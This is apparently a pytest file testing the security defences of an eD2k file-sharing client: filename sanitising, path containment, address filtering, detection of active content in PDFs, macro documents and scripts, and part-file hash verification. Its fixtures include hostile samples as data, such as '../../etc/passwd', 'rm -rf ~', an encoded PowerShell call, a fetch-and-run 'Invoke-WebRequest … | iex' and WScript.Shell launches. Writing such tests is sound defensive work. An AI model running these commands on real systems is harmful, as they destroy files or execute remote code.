"""Unit tests of the defences: file names, paths, addresses, content inspection and the part file."""

import io
import re
import zipfile
from pathlib import Path
from typing import TYPE_CHECKING

import pytest
from Crypto.Hash import MD4

from ed2k_client.constants import BLOCK_SIZE, PART_SIZE
from ed2k_client.errors import HashMismatchError, ProtocolError, SecurityError
from ed2k_client.hashing import hash_file
from ed2k_client.partfile import Block, PartFile, blocks_of_part
from ed2k_client.security import (
    AddressPolicy,
    DocumentKind,
    IpFilter,
    check_document,
    inspect_document,
    resolve_inside,
    sanitize_filename,
)
from ed2k_client.settings import DEFAULT_IO

if TYPE_CHECKING:
    from pyfakefs.fake_filesystem import FakeFilesystem

DOWNLOADS = Path('/downloads')
QUARANTINE = Path('/q')
BOOK = 'book.pdf'
PDF_SUFFIX = '.pdf'
PUBLIC_IP = '8.8.8.8'
LOOPBACK = '127.0.0.1'
PORT = 4662
JS = 'JS'
ZIP_ARCHIVE = 'ZIP archive'
MACRO_DANGER = 'Office document with macros'
MAPS_ZIP = 'maps.zip'


def _zip_of(*names: str) -> bytes:
    """Build a ZIP archive in memory whose members carry the given names.

    :param names: the member names.
    :type names: str
    :returns: the archive bytes.
    :rtype: bytes
    """
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, 'w') as archive:
        for name in names:
            archive.writestr(name, b'member')
    return buffer.getvalue()


MACRO_DOCUMENT = _zip_of('[Content_Types].xml', 'word/document.xml', 'word/vbaProject.bin')
JAVA_ARCHIVE = _zip_of('META-INF/MANIFEST.MF', 'Main.class')
PLAIN_ARCHIVE = _zip_of('maps/europe.png')


class TestSanitizeFilename:
    """Tests of :func:`sanitize_filename`."""

    @pytest.mark.parametrize(
        ('name', 'cleaned'),
        [
            ('../../etc/passwd', '_._etc_passwd'),
            ('.bashrc', 'bashrc'),
            ('CON.pdf', '_CON.pdf'),
            ('a\x00b\x1f|c?.djvu', 'a_b__c_.djvu'),
            ('', 'download'),
            ('x' * 400 + PDF_SUFFIX, 'x' * 196 + PDF_SUFFIX),
        ],
    )
    def test_sanitize_filename(self, name: str, cleaned: str) -> None:
        """Separators, control characters, dot files, device names and overlong names are neutralised.

        :param name: the name as received.
        :type name: str
        :param cleaned: the name expected on disk.
        :type cleaned: str
        """
        assert sanitize_filename(name) == cleaned


class TestResolveInside:
    """Tests of :func:`resolve_inside`."""

    def test_resolve_inside_refuses_escapes(self, fs: FakeFilesystem) -> None:
        """A name that still resolves outside the directory is refused.

        :param fs: the in-memory file system.
        :type fs: FakeFilesystem
        """
        fs.create_dir(DOWNLOADS)

        assert resolve_inside(DOWNLOADS, BOOK) == DOWNLOADS / BOOK
        with pytest.raises(SecurityError):
            resolve_inside(DOWNLOADS, '../' + BOOK)


class TestAddressPolicy:
    """Tests of :class:`AddressPolicy`."""

    def test_address_policy_allows_only_global_unfiltered_addresses(self) -> None:
        """Private, loopback, multicast and filtered addresses and bad ports are refused."""
        ip_filter = IpFilter.parse(
            ['080.039.000.000 - 080.039.255.255 , 000 , Bad range', '1.1.1.1 - 1.1.1.1 , 200 , kept']
        )
        policy = AddressPolicy(ip_filter=ip_filter)

        assert policy.permits(PUBLIC_IP, PORT)
        assert policy.permits('1.1.1.1', PORT)
        for host in (LOOPBACK, '10.0.0.5', '224.0.0.1', '80.39.196.113'):
            assert not policy.permits(host, PORT)
        assert not policy.permits(PUBLIC_IP, 0)
        assert not policy.permits('not-an-ip', PORT)
        assert AddressPolicy(allow_private=True).permits(LOOPBACK, PORT)


class TestInspectDocument:
    """Tests of :func:`inspect_document`."""

    @pytest.mark.parametrize(
        ('content', 'kind', 'dangerous'),
        [
            (b'%PDF-1.7\n/Type /Catalog /OpenAction 3 0 R', DocumentKind.PDF, ()),
            (b'%PDF-1.4\n<< /S /J#61vaScript /JS (x) >>', DocumentKind.PDF, (JS, 'JavaScript')),
            (b'%PDF-1.4\n/Launch /EmbeddedFile', DocumentKind.PDF, ('EmbeddedFile', 'Launch')),
            (b'%PDF-1.4\n1 0 obj << >> stream\n\x00/JS\x00 endstream /Type', DocumentKind.PDF, ()),
            (b'%PDF-1.4\n<< /JS 2 0 R >> stream\nabc\nendstream', DocumentKind.PDF, (JS,)),
            # The stream keyword hides nothing inside a string, a comment or after anything but a dictionary
            (b'%PDF-1.4\n<< /T (x stream\n) /JS 1 0 R >>\n<< >> stream\nabc\nendstream', DocumentKind.PDF, (JS,)),
            (b'%PDF-1.4\n<< /T (a\\) (b) >> stream\n) /JS 1 0 R >>\n<< >> stream\nendstream', DocumentKind.PDF, (JS,)),
            (b'%PDF-1.4\n%>> stream\n<< /JS 1 0 R >>\n<< >> stream\nabc\nendstream', DocumentKind.PDF, (JS,)),
            (b'%PDF-1.4\n/Xstream\n/JS 1 0 R\n<< >> stream\nabc\nendstream', DocumentKind.PDF, (JS,)),
            (b'AT&TFORM\x00\x00\x00\x10DJVM', DocumentKind.DJVU, ()),
            (b'MZ\x90\x00', DocumentKind.OTHER, ('Windows executable',)),
            (b'PK\x03\x04', DocumentKind.OTHER, ()),
        ],
    )
    def test_inspect_document(
        self, fs: FakeFilesystem, content: bytes, kind: DocumentKind, dangerous: tuple[str, ...]
    ) -> None:
        """Magic bytes decide the kind, and hex-escaped PDF names do not hide active content.

        :param fs: the in-memory file system.
        :type fs: FakeFilesystem
        :param content: the file content.
        :type content: bytes
        :param kind: the kind the content must be classified as.
        :type kind: DocumentKind
        :param dangerous: the dangerous keys or formats expected, sorted.
        :type dangerous: tuple[str, ...]
        """
        path = QUARANTINE / 'file.bin'
        fs.create_file(path, contents=content)

        verdict = inspect_document(path)

        assert (verdict.kind, verdict.dangerous) == (kind, dangerous)

    def test_pdf_scan_is_exact_across_read_chunks(self, fs: FakeFilesystem) -> None:
        """A stream body that crosses a read chunk hides its bytes, and a key cut by a chunk edge is still found.

        :param fs: the in-memory file system.
        :type fs: FakeFilesystem
        """
        edge = DEFAULT_IO.scan_chunk - 4
        head = b'%PDF-1.7\n1 0 obj << >> stream\n'
        body = head + b'\x00' * (edge - len(head)) + b'/JS\x00' * 8 + b'\nendstream\n'
        trap = body + b'\x00' * (2 * DEFAULT_IO.scan_chunk - 4 - len(body)) + b'/JavaScript '
        path = QUARANTINE / 'edge.pdf'
        fs.create_file(path, contents=trap)

        assert inspect_document(path).dangerous == ('JavaScript',)

    def test_pdf_string_spanning_read_chunks_keeps_its_stream_keyword_inert(self, fs: FakeFilesystem) -> None:
        """A string opened in one read chunk still holds a fake stream start that arrives in the next one.

        :param fs: the in-memory file system.
        :type fs: FakeFilesystem
        """
        head = b'%PDF-1.7\n<< /T ('
        filler = b'a' * (DEFAULT_IO.scan_chunk - len(head))
        path = QUARANTINE / 'long-title.pdf'
        fs.create_file(path, contents=head + filler + b'>> stream\n) /JS 1 0 R >>\n<< >> stream\nabc\nendstream')

        assert inspect_document(path).dangerous == (JS,)


class TestCheckDocument:
    """Tests of :func:`check_document`."""

    def test_check_document_refuses_wrong_kind(self, fs: FakeFilesystem) -> None:
        """A DjVu passes when DjVu is expected and fails when only PDF is.

        :param fs: the in-memory file system.
        :type fs: FakeFilesystem
        """
        path = QUARANTINE / 'book.djvu'
        fs.create_file(path, contents=b'AT&TFORM....')

        assert check_document(path, expected=(DocumentKind.DJVU,)).kind == DocumentKind.DJVU
        with pytest.raises(SecurityError, match='content is djvu'):
            check_document(path, expected=(DocumentKind.PDF,))

    def test_check_without_kinds_refuses_only_active_content(self, fs: FakeFilesystem) -> None:
        """With no expected kinds an archive passes as notable, while a program or a script is refused.

        :param fs: the in-memory file system.
        :type fs: FakeFilesystem
        """
        archive, program, script = QUARANTINE / MAPS_ZIP, QUARANTINE / 'setup.exe', QUARANTINE / 'run.sh'
        fs.create_file(archive, contents=b'PK\x03\x04rest')
        fs.create_file(program, contents=b'MZ\x90\x00')
        fs.create_file(script, contents=b'#!/bin/sh\nrm -rf ~\n')

        assert check_document(archive, expected=None).notable == (ZIP_ARCHIVE,)
        with pytest.raises(SecurityError, match='Windows executable'):
            check_document(program, expected=None)
        with pytest.raises(SecurityError, match='script'):
            check_document(script, expected=None)

    @pytest.mark.parametrize(
        ('file_name', 'payload', 'danger'),
        [
            ('invoice.docm', MACRO_DOCUMENT, MACRO_DANGER),
            ('invoice.zip', MACRO_DOCUMENT, MACRO_DANGER),
            ('tool.jar', JAVA_ARCHIVE, 'Java archive'),
            ('setup.bat', b'@echo off\r\npowershell -enc AAAA\r\n', '.bat'),
            ('book.js', b'new ActiveXObject("WScript.Shell").Run("calc")\n', '.js'),
            ('run.ps1', b'Invoke-WebRequest https://example.org | iex\n', '.ps1'),
        ],
    )
    def test_check_without_kinds_refuses_files_that_run_when_opened(
        self, fs: FakeFilesystem, file_name: str, payload: bytes, danger: str
    ) -> None:
        """A macro document, a Java archive or a script without a shebang is refused by its members or its name.

        Their first bytes are those of a plain archive or of text, so only the members and the name tell that the
        file runs when it is opened.

        :param fs: the in-memory file system.
        :type fs: FakeFilesystem
        :param file_name: the file name.
        :type file_name: str
        :param payload: the file content.
        :type payload: bytes
        :param danger: what the refusal names.
        :type danger: str
        """
        path = QUARANTINE / file_name
        fs.create_file(path, contents=payload)

        with pytest.raises(SecurityError, match=re.escape(danger)):
            check_document(path, expected=None)

    def test_plain_archive_passes_without_kinds(self, fs: FakeFilesystem) -> None:
        """An archive of data members passes with the archive noted, so the member check refuses only what runs.

        :param fs: the in-memory file system.
        :type fs: FakeFilesystem
        """
        path = QUARANTINE / MAPS_ZIP
        fs.create_file(path, contents=PLAIN_ARCHIVE)

        assert check_document(path, expected=None).notable == (ZIP_ARCHIVE,)

    def test_document_named_to_run_is_refused(self, fs: FakeFilesystem) -> None:
        """A clean PDF that carries an HTML application's name is refused, because Windows opens it with mshta.

        :param fs: the in-memory file system.
        :type fs: FakeFilesystem
        """
        path = QUARANTINE / 'book.hta'
        fs.create_file(path, contents=b'%PDF-1.7\n<html><script>new ActiveXObject("WScript.Shell")</script></html>')

        with pytest.raises(SecurityError, match=re.escape('.hta')):
            check_document(path, expected=(DocumentKind.PDF, DocumentKind.DJVU))


def make_part_file(fs: FakeFilesystem, data: bytes) -> PartFile:
    """Create a part file for ``data`` whose hash is computed from the same bytes.

    :param fs: the in-memory file system.
    :type fs: FakeFilesystem
    :param data: the file content.
    :type data: bytes
    :returns: the part file.
    :rtype: PartFile
    """
    source = Path('/src') / BOOK
    fs.create_file(source, contents=data)
    hashes = hash_file(source)
    part_file = PartFile.open(directory=QUARANTINE, name=BOOK, size=len(data), file_hash=hashes.file_hash)
    if hashes.part_hashes:
        part_file.set_hashset(hashes.part_hashes)
    return part_file


class TestPartFile:
    """Tests of :class:`PartFile`."""

    def test_part_file_verifies_and_resumes(self, fs: FakeFilesystem) -> None:
        """Blocks written in pieces complete and verify a part, and a reopened part file remembers it.

        :param fs: the in-memory file system.
        :type fs: FakeFilesystem
        """
        data = bytes(range(256)) * (2 * BLOCK_SIZE // 256)
        part_file = make_part_file(fs, data)
        blocks = list(part_file.missing_blocks())

        assert part_file.write(block=blocks[0], start=0, data=data[:1000]) is None
        assert part_file.write(block=blocks[0], start=1000, data=data[1000:BLOCK_SIZE]) is None
        assert part_file.write(block=blocks[1], start=BLOCK_SIZE, data=data[BLOCK_SIZE:]) == 0
        assert part_file.complete

        reopened = PartFile.open(directory=QUARANTINE, name=BOOK, size=len(data), file_hash=part_file.file_hash)
        assert reopened.complete

    def test_repeated_data_does_not_complete_a_block(self, fs: FakeFilesystem) -> None:
        """The same piece sent twice covers the same bytes once, so the block stays incomplete.

        :param fs: the in-memory file system.
        :type fs: FakeFilesystem
        """
        data = bytes(BLOCK_SIZE)
        part_file = make_part_file(fs, data)
        block = next(part_file.missing_blocks())
        half = data[: BLOCK_SIZE // 2]

        part_file.write(block=block, start=0, data=half)
        part_file.write(block=block, start=0, data=half)

        assert list(part_file.missing_blocks()) == [block]

    def test_corrupt_part_is_wiped_and_requested_again(self, fs: FakeFilesystem) -> None:
        """A part whose MD4 fails raises and becomes missing again.

        :param fs: the in-memory file system.
        :type fs: FakeFilesystem
        """
        part_file = make_part_file(fs, bytes(1000))
        block = next(part_file.missing_blocks())

        with pytest.raises(HashMismatchError):
            part_file.write(block=block, start=0, data=b'\x01' * 1000)
        assert list(part_file.missing_blocks()) == [block]

    def test_data_outside_the_block_is_refused(self, fs: FakeFilesystem) -> None:
        """A peer cannot write outside the block it was asked for.

        :param fs: the in-memory file system.
        :type fs: FakeFilesystem
        """
        part_file = make_part_file(fs, bytes(1000))

        with pytest.raises(ProtocolError, match='outside block'):
            part_file.write(block=Block(0, 100), start=50, data=bytes(100))

    def test_forged_hashset_is_refused(self, fs: FakeFilesystem) -> None:
        """A hashset that does not combine into the file hash is rejected.

        :param fs: the in-memory file system.
        :type fs: FakeFilesystem
        """
        data = bytes(PART_SIZE + 10)
        source = Path('/src/big.bin')
        fs.create_file(source, contents=data)
        file_hash = hash_file(source).file_hash
        part_file = PartFile.open(directory=QUARANTINE, name='big.bin', size=len(data), file_hash=file_hash)

        with pytest.raises(ProtocolError, match='hashset'):
            part_file.set_hashset([MD4.new(b'x').digest(), MD4.new(b'y').digest()])


class TestBlocksOfPart:
    """Tests of :func:`blocks_of_part`."""

    def test_blocks_never_cross_a_part_boundary(self) -> None:
        """The last block of a part is short, so no request spans two parts."""
        blocks = blocks_of_part(size=2 * PART_SIZE, part=0)

        assert blocks[-1].end == PART_SIZE
        assert all(block.part == 0 for block in blocks)
